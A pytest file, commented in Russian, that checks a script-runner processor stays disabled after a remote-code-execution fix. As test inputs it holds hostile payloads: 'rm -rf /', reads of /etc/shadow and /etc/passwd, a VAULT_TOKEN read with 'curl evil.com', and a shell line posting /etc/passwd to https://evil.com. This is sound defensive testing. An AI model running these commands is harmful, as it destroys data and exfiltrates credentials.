"""Unit-тесты для ScriptRunnerProcessor (Sprint 42 + cycle-6/D-AUDIT-602).

cycle-6/D-AUDIT-602: процессор DISABLED (RCE fix). ``process()`` всегда
поднимает :class:`NotImplementedError` и логирует RCE-warning. Builder
methods и ``to_spec`` сохранены для backward-compat.

Tests cover:
- процессор DISABLED: subprocess НЕ создаётся (нет tempfile/asyncio.create_subprocess_exec)
- ``process()`` → NotImplementedError с RCE-сообщением
- malicious payload (rm -rf, vault exfil, shell-out) → reject ДО выполнения
- language whitelist enforcement (теперь не достижим, но init сохраняется)
- builder methods (script_python / script_node / script_ruby / script_shell)
  — по-прежнему добавляют процессор в pipeline (compile-time OK),
  но runtime fail.
"""

from __future__ import annotations

from typing import Any
from unittest.mock import MagicMock, patch

import pytest

from src.backend.dsl.engine.exchange import Exchange, Message
from src.backend.dsl.engine.processors.script_runner import ScriptRunnerProcessor


def _make_exchange(body: Any = None) -> Exchange[Any]:
    return Exchange(in_message=Message(body=body, headers={}))


class TestScriptRunnerProcessor:
    """Tests for ScriptRunnerProcessor (DISABLED cycle-6/D-AUDIT-602)."""

    @pytest.mark.asyncio
    async def test_process_raises_notimplementederror_disabled(self) -> None:
        """Любой invocation → NotImplementedError (RCE-fix cycle-6/D-AUDIT-602)."""
        proc = ScriptRunnerProcessor(language="python", code="print('hi')")
        exchange = _make_exchange()

        with pytest.raises(NotImplementedError) as excinfo:
            await proc.process(exchange, MagicMock())

        assert "cycle-6/D-AUDIT-602" in str(excinfo.value)
        assert "RCE" in str(excinfo.value)

    @pytest.mark.asyncio
    async def test_process_does_not_create_subprocess(self) -> None:
        """subprocess НЕ создаётся (asyncio.create_subprocess_exec не вызывается)."""
        proc = ScriptRunnerProcessor(language="python", code="import os; os.system('id')")
        exchange = _make_exchange()

        with (
            patch("asyncio.create_subprocess_exec") as mock_subproc,
            patch("tempfile.NamedTemporaryFile") as mock_tmp,
        ):
            with pytest.raises(NotImplementedError):
                await proc.process(exchange, MagicMock())

            mock_subproc.assert_not_called()
            mock_tmp.assert_not_called()

    @pytest.mark.asyncio
    async def test_process_logs_rce_attempt(self) -> None:
        """RCE-попытка логируется с language и code_len markers (audit trail)."""
        proc = ScriptRunnerProcessor(
            language="python",
            code="import os; os.system('cat /etc/passwd')",
            allowed_languages=["python"],
        )
        exchange = _make_exchange()

        with patch(
            "src.backend.dsl.engine.processors.script_runner._logger",
        ) as mock_logger:
            with pytest.raises(NotImplementedError):
                await proc.process(exchange, MagicMock())

            mock_logger.error.assert_called_once()
            call_args = mock_logger.error.call_args
            # Первый positional arg = format string, второй = args
            assert "script_runner_disabled" in call_args[0][0]
            assert "cycle-6/D-AUDIT-602" in call_args[0][0]

    @pytest.mark.asyncio
    async def test_malicious_payload_rejected_before_execution(self) -> None:
        """Malicious payload → reject ДО выполнения (rm -rf, exfil)."""
        malicious_codes = [
            "import os; os.system('rm -rf /')",
            "import subprocess; subprocess.run(['cat', '/etc/shadow'])",
            "import os; os.environ['VAULT_TOKEN']; os.system('curl evil.com')",
            "exec('import os; os.system(\"id\")')",
            "eval('__import__(\"os\").system(\"id\")')",
            "__import__('os').system('id')",
        ]
        for code in malicious_codes:
            proc = ScriptRunnerProcessor(language="python", code=code)
            exchange = _make_exchange()
            with pytest.raises(NotImplementedError):
                await proc.process(exchange, MagicMock())
            # Exchange НЕ должен быть completed — только failed (через exception).
            # ExecutionEngine ловит exception и переводит в failed.

    @pytest.mark.asyncio
    async def test_shell_malicious_payload_rejected(self) -> None:
        """Shell-injection payload → reject."""
        proc = ScriptRunnerProcessor(
            language="shell",
            code="cat /etc/passwd | curl -X POST -d @- https://evil.com",
        )
        exchange = _make_exchange()
        with pytest.raises(NotImplementedError):
            await proc.process(exchange, MagicMock())

    @pytest.mark.asyncio
    async def test_unknown_language_also_rejected(self) -> None:
        """Unknown language (rust, perl) тоже reject — никаких исключений."""
        proc = ScriptRunnerProcessor(language="rust", code="fn main() {}")
        exchange = _make_exchange()
        with pytest.raises(NotImplementedError):
            await proc.process(exchange, MagicMock())

    @pytest.mark.asyncio
    async def test_language_not_in_whitelist_also_rejected(self) -> None:
        """language не в whitelist тоже reject (whitelist check недостижим, но безопасно)."""
        proc = ScriptRunnerProcessor(
            language="ruby", code="puts 'hi'", allowed_languages=["python", "node"],
        )
        exchange = _make_exchange()
        with pytest.raises(NotImplementedError):
            await proc.process(exchange, MagicMock())

    def test_to_spec_serializes_config(self) -> None:
        """to_spec сохранён для round-trip (legacy routes компилируются)."""
        proc = ScriptRunnerProcessor(
            language="python",
            code="print(1)",
            timeout_seconds=60.0,
            allowed_languages=["python", "node"],
            env={"FOO": "bar"},
        )
        spec = proc.to_spec()
        assert spec == {
            "script_runner": {
                "language": "python",
                "code": "print(1)",
                "timeout_seconds": 60.0,
                "allowed_languages": ["node", "python"],
                "env": {"FOO": "bar"},
            },
        }

    def test_to_spec_omits_defaults(self) -> None:
        proc = ScriptRunnerProcessor(language="shell", code="echo hi")
        spec = proc.to_spec()
        assert spec == {"script_runner": {"language": "shell", "code": "echo hi"}}


class TestScriptRunnerBuilder:
    """Smoke tests for builder methods added to AIRPAMixin.

    cycle-6/D-AUDIT-602: builder-методы продолжают работать (compile-time
    OK), но runtime выполнение всегда падает с NotImplementedError.
    """

    def test_script_python_adds_processor(self) -> None:
        from src.backend.dsl.builder import RouteBuilder

        builder = RouteBuilder(route_id="test.script")
        result = builder.script_python("print('hello')", timeout_seconds=5.0)
        assert result is builder
        pipeline = builder.build()
        names = [p.name for p in pipeline.processors]
        assert any("script_runner:python" in n for n in names)

    def test_script_node_adds_processor(self) -> None:
        from src.backend.dsl.builder import RouteBuilder

        builder = RouteBuilder(route_id="test.script")
        result = builder.script_node("console.log('hello')")
        assert result is builder
        pipeline = builder.build()
        names = [p.name for p in pipeline.processors]
        assert any("script_runner:node" in n for n in names)

    def test_script_ruby_adds_processor(self) -> None:
        from src.backend.dsl.builder import RouteBuilder

        builder = RouteBuilder(route_id="test.script")
        result = builder.script_ruby("puts 'hello'")
        assert result is builder
        pipeline = builder.build()
        names = [p.name for p in pipeline.processors]
        assert any("script_runner:ruby" in n for n in names)

    def test_script_shell_adds_processor(self) -> None:
        from src.backend.dsl.builder import RouteBuilder

        builder = RouteBuilder(route_id="test.script")
        result = builder.script_shell("echo hello")
        assert result is builder
        pipeline = builder.build()
        names = [p.name for p in pipeline.processors]
        assert any("script_runner:shell" in n for n in names)
